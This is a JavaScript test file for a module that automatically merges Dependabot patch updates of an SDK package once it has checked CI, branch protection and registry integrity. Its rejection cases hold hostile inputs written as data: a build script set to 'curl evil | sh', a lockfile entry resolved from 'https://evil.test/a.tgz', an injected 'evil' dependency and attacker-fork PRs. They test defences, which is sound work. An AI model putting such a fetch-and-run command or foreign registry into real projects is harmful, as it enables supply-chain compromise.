import test from 'node:test';
import assert from 'node:assert/strict';
import {validatePatchFiles,requestPatchAutoMerge} from '../src/patch-auto-merge.mjs';
import {mkdtemp,writeFile,rm} from 'node:fs/promises';
import {tmpdir} from 'node:os';
import {join} from 'node:path';
import {writeProjectConfig} from '../src/config.mjs';
import {sha256} from '../src/protection-inventory.mjs';

const baseSha='a'.repeat(40),headSha='b'.repeat(40),integrity='sha512-'+Buffer.alloc(64,1).toString('base64');
function files() {
  const basePackage={private:true,scripts:{build:'vite build'},devDependencies:{'nakwol-connect':'0.14.0',vite:'1.0.0'}};
  const nextPackage=structuredClone(basePackage);nextPackage.devDependencies['nakwol-connect']='0.14.1';
  const baseLock={lockfileVersion:3,packages:{'':{devDependencies:basePackage.devDependencies},'node_modules/nakwol-connect':{version:'0.14.0',resolved:'https://registry.npmjs.org/nakwol-connect/-/nakwol-connect-0.14.0.tgz',integrity},'node_modules/vite':{version:'1.0.0'}}};
  const nextLock=structuredClone(baseLock);nextLock.packages[''].devDependencies['nakwol-connect']='0.14.1';
  Object.assign(nextLock.packages['node_modules/nakwol-connect'],{version:'0.14.1',resolved:'https://registry.npmjs.org/nakwol-connect/-/nakwol-connect-0.14.1.tgz'});
  return {basePackage,nextPackage,baseLock,nextLock};
}
test('only an exact SDK patch and matching registry lock entry are automatically eligible',()=>{
  assert.equal(validatePatchFiles(files()).version,'0.14.1');
});
for(const [name,mutate] of [
  ['minor',f=>f.nextPackage.devDependencies['nakwol-connect']='0.15.0'],
  ['downgrade',f=>f.nextPackage.devDependencies['nakwol-connect']='0.13.9'],
  ['range',f=>f.nextPackage.devDependencies['nakwol-connect']='^0.14.1'],
  ['script',f=>f.nextPackage.scripts.build='curl evil | sh'],
  ['other dependency',f=>f.nextLock.packages['node_modules/vite'].version='2.0.0'],
  ['new transitive dependency',f=>f.nextLock.packages['node_modules/evil']={version:'1.0.0'}],
  ['install script',f=>f.nextLock.packages['node_modules/nakwol-connect'].hasInstallScript=true],
  ['foreign registry',f=>f.nextLock.packages['node_modules/nakwol-connect'].resolved='https://evil.test/a.tgz'],
  ['lock mismatch',f=>f.nextLock.packages[''].devDependencies['nakwol-connect']='0.14.9'],
]) test(`${name}: patch validation refuses unrelated or incompatible mutation`,()=>{
  const f=files();mutate(f);assert.throws(()=>validatePatchFiles(f));
});
async function fixture(t) {
  const root=await mkdtemp(join(tmpdir(),'nakwol-auto-pr-'));t.after(()=>rm(root,{recursive:true,force:true}));
  const source='process.stdout.write("{}");';await writeFile(join(root,'adapter.mjs'),source);
  await writeProjectConfig(root,{clientId:'site',authMode:'required',accessPolicy:'member',protection:{siteUrl:'https://site.test/',automation:{autoMerge:true},automatic:{enabled:true,provider:'vercel',resourceId:'project',serializedDeployments:true,adapterFile:'adapter.mjs',adapterSha256:sha256(source),credentialEnv:[],sessionCookieEnv:'NAKWOL_CI_COOKIE',previousManifest:'previous.json',previousReport:'previous-report.json'}}});
  const eventFile=join(root,'event.json');await writeFile(eventFile,JSON.stringify({workflow_run:{id:10}}));
  const f=files(),calls=[];
  const pr={number:7,node_id:'PR_test',state:'open',draft:false,user:{login:'dependabot[bot]',type:'Bot'},base:{sha:baseSha,ref:'main',repo:{full_name:'owner/site'}},head:{sha:headSha,repo:{full_name:'owner/site'}}};
  const run={id:10,workflow_id:11,check_suite_id:12,event:'pull_request',status:'completed',conclusion:'success',head_sha:headSha,head_repository:{full_name:'owner/site'},pull_requests:[{number:7}]};
  const responses={
    '/repos/owner/site':{default_branch:'main'},
    '/repos/owner/site/actions/runs/10':run,
    '/repos/owner/site/actions/workflows/nakwol-gate-check.yml':{id:11,path:'.github/workflows/nakwol-gate-check.yml'},
    '/repos/owner/site/pulls/7':pr,
    '/repos/owner/site/pulls/7/files?per_page=100':[{filename:'package.json',status:'modified'},{filename:'package-lock.json',status:'modified'}],
    '/repos/owner/site/check-suites/12':{app:{id:15368,slug:'github-actions'}},
    '/repos/owner/site/actions/runs/10/jobs?per_page=100':{total_count:1,jobs:[{name:'check',conclusion:'success'}]},
    '/repos/owner/site/branches/main/protection':{enforce_admins:{enabled:true},required_status_checks:{strict:true,contexts:['check'],checks:[{context:'check',app_id:15368}]}},
    '/repos/owner/site/git/ref/heads/main':{object:{sha:baseSha}},
  };
  const fetchImpl=async(url,init={})=>{
    const u=new URL(url);calls.push({url:u.href,method:init.method||'GET',body:init.body});
    if(u.hostname==='registry.npmjs.org') return Response.json({name:'nakwol-connect',version:'0.14.1',dist:{integrity,tarball:f.nextLock.packages['node_modules/nakwol-connect'].resolved}});
    if(u.pathname==='/graphql') return Response.json({data:{mergePullRequest:{pullRequest:{number:7,merged:true,mergeCommit:{oid:'c'.repeat(40)}}}}});
    if(u.pathname.includes('/contents/')) {
      const base=u.searchParams.get('ref')===baseSha,file=u.pathname.endsWith('package.json')?(base?f.basePackage:f.nextPackage):(base?f.baseLock:f.nextLock);
      return Response.json({encoding:'base64',content:Buffer.from(JSON.stringify(file)).toString('base64')});
    }
    const response=responses[u.pathname+u.search];
    assert.notEqual(response,undefined,u.href);return Response.json(response);
  };
  return {root,eventFile,repository:'owner/site',apiToken:'private-github-token',fetchImpl,responses,f,calls};
}
test('trusted controller merges only the inspected head without arming future heads or deploying',async t=>{
  const f=await fixture(t),result=await requestPatchAutoMerge(f);
  assert.equal(result.status,'patch-merged');assert.equal(result.deployed,false);
  assert.equal(f.calls.filter(c=>c.method==='POST').length,1);
  assert.equal(f.calls.find(c=>c.method==='POST').url,'https://api.github.com/graphql');
  assert.equal(JSON.parse(f.calls.find(c=>c.method==='POST').body).variables.input.expectedHeadOid,headSha);
  assert.equal(JSON.parse(f.calls.find(c=>c.method==='POST').body).query.includes('enablePullRequestAutoMerge'),false);
  assert.equal(JSON.stringify(result).includes(f.apiToken),false);
});
test('head change at the final atomic merge is rejected and never reported as merged',async t=>{
  const f=await fixture(t),original=f.fetchImpl;
  f.fetchImpl=async(url,init)=>{
    if(new URL(url).pathname==='/graphql') {
      assert.equal(JSON.parse(init.body).variables.input.expectedHeadOid,headSha);
      return Response.json({errors:[{message:'Expected head differs from current head'}]});
    }
    return original(url,init);
  };
  await assert.rejects(requestPatchAutoMerge(f),/did not merge/i);
});
for(const [name,mutate] of [
  ['fork',f=>f.responses['/repos/owner/site/pulls/7'].head.repo.full_name='attacker/fork'],
  ['human author',f=>f.responses['/repos/owner/site/pulls/7'].user={login:'attacker',type:'User'}],
  ['CI stale head',f=>f.responses['/repos/owner/site/actions/runs/10'].head_sha=baseSha],
  ['wrong workflow',f=>f.responses['/repos/owner/site/actions/runs/10'].workflow_id=99],
  ['failed check',f=>f.responses['/repos/owner/site/actions/runs/10'].conclusion='failure'],
  ['extra file',f=>f.responses['/repos/owner/site/pulls/7/files?per_page=100'].push({filename:'.nakwol-connect.json',status:'modified'})],
  ['unprotected branch',f=>f.responses['/repos/owner/site/branches/main/protection'].required_status_checks=null],
  ['non-strict checks',f=>f.responses['/repos/owner/site/branches/main/protection'].required_status_checks.strict=false],
  ['foreign required check app',f=>f.responses['/repos/owner/site/branches/main/protection'].required_status_checks.checks[0].app_id=777],
  ['skipped gate job',f=>f.responses['/repos/owner/site/actions/runs/10/jobs?per_page=100'].jobs[0].conclusion='skipped'],
  ['base advanced',f=>f.responses['/repos/owner/site/git/ref/heads/main'].object.sha=headSha],
  ['registry integrity mismatch',f=>f.f.nextLock.packages['node_modules/nakwol-connect'].integrity='sha512-'+Buffer.alloc(64,2).toString('base64')],
]) test(`${name}: rejected PR causes zero privileged mutations`,async t=>{
  const f=await fixture(t);mutate(f);
  await assert.rejects(requestPatchAutoMerge(f));
  assert.equal(f.calls.filter(c=>c.method==='POST').length,0);
});
